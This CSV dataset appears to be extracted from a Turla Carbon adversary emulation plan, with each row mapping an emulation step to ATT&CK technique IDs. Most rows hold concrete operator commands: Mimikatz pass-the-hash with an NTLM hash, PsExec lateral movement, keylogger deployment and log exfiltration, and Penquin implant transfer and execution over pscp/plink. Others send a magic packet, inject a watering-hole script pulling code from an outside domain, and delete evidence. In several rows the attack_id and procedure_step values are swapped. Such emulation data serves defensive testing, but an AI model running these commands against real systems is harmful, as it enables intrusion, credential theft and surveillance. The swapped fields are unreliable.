org_name,plan_id,scenario_id,step_id,step_order,step_title,step_text,attack_technique_ids_raw,attack_technique_ids_parent,source_file,mapping_method,mapping_quality
turla_carbon,turla_carbon,unknown,turla_carbon::40,40,Ingress tool transfer,attack_id: T1105 | name: Ingress tool transfer,"[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::41,41,Copy installer & execute using PsExec (Adversary),"id: 824d5eda-7743-4c10-89d8-143d4bc50eda | name: Copy installer & execute using PsExec (Adversary) | description: Task the CARBON-DLL implant on the domain controller to use the previously downloaded Mimikatz to pass-the-hash and (1) copy the installer to Adalwolfa's workstation and (2) execute it using PsExec.
 | tactic: Lateral Movement | technique: attack_id: T1550.002 | name: Use Alternate Authentication Material: Pass the Hash | procedure_group: procedure_lateral_movement | procedure_step: 7.A.3 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{""id"": 6, ""cmd"": ""C:\\Windows\\System32\\terabox.exe \""pr::d\"" \""slsa::htp /user:#{third.target.user} /domain:#{network.domain.name} /ntlm:#{third.target.ntlm} /remotepc:#{third.target.host} /pexe:C:\\Windows\\System32\\wsqsp.exe /sys:1 /prun:C:\\Windows\\System32\\wsqmanager.exe\"" \""quit\""""}' --task-wait-timeout 60
 | input_arguments: third.target.ntlm: description: The NTLM hash for the third target user. | type: string | default: 07d128430a6338f8d537f6b3ae1dc136 | third.target.host: description: The hostname of the third target host. | type: string | default: khabibulin | requirements: plugins.emu.app.requirements.check_registered: source: second.carbon.id","[""T1550.002""]","[""T1550""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::42,42,Use Alternate Authentication Material: Pass the Hash,attack_id: T1550.002 | name: Use Alternate Authentication Material: Pass the Hash,"[""T1550.002""]","[""T1550""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::43,43,Clean dropped files (Adversary),"id: e7c827d6-57f8-40d0-b3a9-e03b2e4d0484 | name: Clean dropped files (Adversary) | description: Task the CARBON-DLL implant on the domain controller to clean up dropped files.
 | tactic: Defense Evasion | technique: attack_id: 7.A.5 | name: Indicator Removal on Host: File Deletion | procedure_group: procedure_defense_evasion | procedure_step: T1070.004 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{""id"": 7, ""cmd"": ""del /Q C:\\Windows\\System32\\terabox.exe C:\\Windows\\System32\\wsqsp.exe C:\\Windows\\System32\\wsqmanager.exe""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: second.carbon.id","[""T1070.004""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::44,44,Download and execute keylogger (Adversary),"id: 1a9e352f-4edb-480d-b29c-66acb6c4df19 | name: Download and execute keylogger (Adversary) | description: Task the CARBON-DLL on Adalwolfa's workstation to download and execute the keylogger binary in the background.
 | tactic: Collection | technique: attack_id: 8.A.2 | name: Input Capture: Keylogging | procedure_group: procedure_collection | procedure_step: T1056.001 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 0, ""payload"": ""keylogger.exe"", ""payload_dest"": ""C:\\Windows\\Temp\\wingtsvcupdt.exe"", ""cmd"": ""C:\\Windows\\Temp\\wingtsvcupdt.exe -r""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: third.carbon.id","[""T1056.001""]","[""T1056""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::45,45,Kill keylogger process (Adversary),"id: cefe85b8-d1e5-4077-afac-81a6622f4c66 | name: Kill keylogger process (Adversary) | description: Task the CARBON-DLL implant on Adalwolfa's workstation to kill the keylogger process.
 | tactic: Collection | technique: attack_id: 8.A.2 | name: Input Capture: Keylogging | procedure_group: procedure_collection | procedure_step: T1056.001 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 1, ""cmd"": ""taskkill /IM wingtsvcupdt.exe /F""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: third.carbon.id","[""T1056.001""]","[""T1056""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::46,46,Exfiltrate keylogged data (Adversary),"id: 438939c8-e95a-4fbd-b659-06f0b0b72e47 | name: Exfiltrate keylogged data (Adversary) | description: Task the CARBON-DLL implant to exfiltrate the data written to the keylogger file
 | tactic: Collection | technique: attack_id: 8.A.2 | name: Input Capture: Keylogging | procedure_group: procedure_collection | procedure_step: T1056.001 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 2, ""cmd"": ""type %temp%\\~DFA512.tmp""}' --task-wait-timeout 200
 | timeout: 200 | requirements: plugins.emu.app.requirements.check_registered: source: third.carbon.id","[""T1056.001""]","[""T1056""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::47,47,Remove keylogging evidence (Adversary),"id: f8ab9b59-89a7-4c25-90bf-0c2485785a36 | name: Remove keylogging evidence (Adversary) | description: Task the CARBON-DLL implant to remove the keylogger and keylogger output file.
 | tactic: Defense Evasion | technique: attack_id: T1070.004 | name: Indicator Removal on Host: File Deletion | procedure_group: procedure_defense_evasion | procedure_step: 8.A.3 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 3, ""cmd"": ""del /Q C:\\Windows\\Temp\\wingtsvcupdt.exe %temp%\\~DFA512.tmp""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: third.carbon.id","[""T1070.004""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::48,48,Indicator Removal on Host: File Deletion,attack_id: T1070.004 | name: Indicator Removal on Host: File Deletion,"[""T1070.004""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::49,49,Download Penquin (Adversary),"id: 4d5197fa-4ba7-4bfd-9c91-1697ce0a80a4 | name: Download Penquin (Adversary) | description: Task the CARBON-DLL implant on Adawolfa's workstation to download Penquin (named tmp504e.tmp).
 | tactic: Command and Control | technique: attack_id: T1105 | name: Ingress Tool Transfer | procedure_group: procedure_command_and_control | procedure_step: 9.A.1 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 4, ""payload"": ""hsperfdata.zip"", ""payload_dest"": ""C:\\Windows\\Temp\\tmp504e.tmp"", ""cmd"": ""dir C:\\Windows\\Temp\\tmp504e.tmp""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: third.carbon.id","[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::50,50,Ingress Tool Transfer,attack_id: T1105 | name: Ingress Tool Transfer,"[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::51,51,Download pscp.exe (Adversary),"id: d760974d-6466-40b9-8532-b6be578428fc | name: Download pscp.exe (Adversary) | description: Task the implant to download pscp.exe
 | tactic: Command and Control | technique: attack_id: T1105 | name: Ingress Tool Transfer | procedure_group: procedure_command_and_control | procedure_step: 9.A.2 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 5, ""payload"": ""pscp.exe"", ""payload_dest"": ""C:\\Windows\\Temp\\pscp.exe"", ""cmd"": ""move C:\\Windows\\Temp\\pscp.exe C:\\Windows\\System32\\pscp.exe && dir C:\\Windows\\System32\\pscp.exe""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: third.carbon.id","[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::52,52,Ingress Tool Transfer,attack_id: T1105 | name: Ingress Tool Transfer,"[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::53,53,Copy Penquin to Apache web server (Adversary),"id: 83a79c7d-721c-44ac-b8d5-d9ba2bc84852 | name: Copy Penquin to Apache web server (Adversary) | description: Task the implant to copy Penquin to the Apache web server using the third target user's credentials.
 | tactic: Lateral Movement | technique: attack_id: T1021.004 | name: Remote Services: SSH | procedure_group: procedure_lateral_movement | procedure_step: 9.A.3 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 6, ""cmd"": ""echo y | C:\\Windows\\System32\\pscp.exe -pw #{third.target.password} C:\\Windows\\Temp\\tmp504e.tmp #{third.target.user}@#{apache.server.ip}:/tmp/tmp514f524f""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: third.carbon.id","[""T1021.004""]","[""T1021""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::54,54,Remote Services: SSH,attack_id: T1021.004 | name: Remote Services: SSH,"[""T1021.004""]","[""T1021""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::55,55,Download plink.exe (Adversary),"id: 4468cc14-8e77-44cd-93de-b892253b3e27 | name: Download plink.exe (Adversary) | description: Task the implant to download plink.exe
 | tactic: Command and Control | technique: attack_id: T1105 | name: Ingress Tool Transfer | procedure_group: procedure_command_and_control | procedure_step: 9.A.4 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 7, ""payload"": ""plink.exe"", ""payload_dest"": ""C:\\Windows\\Temp\\plink.exe"", ""cmd"": ""move C:\\Windows\\Temp\\plink.exe C:\\Windows\\System32\\plink.exe && dir C:\\Windows\\System32\\plink.exe""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: third.carbon.id","[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::56,56,Ingress Tool Transfer,attack_id: T1105 | name: Ingress Tool Transfer,"[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::57,57,Execute Penquin (Adversary),"id: 8c6a546b-e03b-4761-b422-8eaf40f59580 | name: Execute Penquin (Adversary) | description: Task the implant to execute Penquin
 | tactic: Lateral Movement | technique: attack_id: T1021.004 | name: Remote Services: SSH | procedure_group: procedure_lateral_movement | procedure_step: 9.A.5 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 8, ""cmd"": ""(echo unzip /tmp/tmp514f524f -d /tmp & echo sudo mv /tmp/hsperfdata /root/hsperfdata & echo sudo /root/hsperfdata & echo exit) | C:\\Windows\\System32\\plink.exe -ssh -l #{third.target.user} -pw #{third.target.password} #{apache.server.ip}""}' --task-wait-timeout 200; sleep 60;
 | timeout: 200 | requirements: plugins.emu.app.requirements.check_registered: source: third.carbon.id","[""T1021.004""]","[""T1021""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::58,58,Remote Services: SSH,attack_id: T1021.004 | name: Remote Services: SSH,"[""T1021.004""]","[""T1021""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::59,59,Clean up downloaded files (Adversary),"id: 1fe4de9d-d8d3-4188-8a2a-6ff42394400c | name: Clean up downloaded files (Adversary) | description: Task the implant to clean up downloaded files
 | tactic: Defense Evasion | technique: attack_id: T1070.004 | name: Indicator Removal on Host: File Deletion | procedure_group: procedure_defense_evasion | procedure_step: 9.A.6 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 9, ""cmd"": ""del /Q C:\\Windows\\Temp\\tmp504e.tmp C:\\Windows\\System32\\pscp.exe C:\\Windows\\System32\\plink.exe""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: third.carbon.id","[""T1070.004""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::60,60,Indicator Removal on Host: File Deletion,attack_id: T1070.004 | name: Indicator Removal on Host: File Deletion,"[""T1070.004""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::61,61,Send magic packet to Apache server (Adversary),"id: 7086ff8c-da64-4b85-a3ee-6157fc0e0a70 | name: Send magic packet to Apache server (Adversary) | description: Send the magic packet to the Apache server using the `sendPacket.py` utility
 | tactic: Command and Control | technique: attack_id: T1205 | name: Traffic Signaling | procedure_group: procedure_command_and_control | procedure_step: 10.A.1 | platforms: linux: sh: command: sudo -E python3 /opt/day1/turla/Resources/Penquin/sendPacket.py --handler_ip #{attacker.host.ip} --handler_port 8081 --target_ip #{apache.server.ip} --target_port 8080 --payload_type base64
 | input_arguments: attacker.host.ip: description: The ip address of the attacker's host. | type: string | default: 176.59.15.33","[""T1205""]","[""T1205""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::62,62,Traffic Signaling,attack_id: T1205 | name: Traffic Signaling,"[""T1205""]","[""T1205""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::63,63,Add watering hole redirection (Adversary),"id: 4b6ed411-6b13-484e-bed6-60b07562d6de | name: Add watering hole redirection (Adversary) | description: Send the command to ncat to add the watering hole redirection to `index.html`
 | tactic: Initial Access | technique: attack_id: T1189 | name: Drive-By Compromise | procedure_group: procedure_initial_access | procedure_step: 10.A.4 | platforms: linux: sh: command: echo ""echo \""<script>if (document.getElementById('xyz')) {{}} else {{ var gam = document.createElement('script'); gam.type = 'text/javascript'; gam.async = true; gam.src = ('http://anto-int.com/counter.js'); var sm = document.getElementsByTagName('script')[0]; sm.parentNode.insertBefore(gam, sm); var fl = document.createElement('span'); fl.id = 'xyz'; var d =  document.getElementsByTagName('div')[0]; d.parentNode.insertBefore(fl, d);}}</script>\"" >> /var/www/html/index.html"" > input_pipe;
echo exit > input_pipe;
rm input_pipe output_pipe;
ps aux | grep '[n]cat' | awk '{print $2}' | while read line; do kill $line; done
","[""T1189""]","[""T1189""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::64,64,Drive-By Compromise,attack_id: T1189 | name: Drive-By Compromise,"[""T1189""]","[""T1189""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
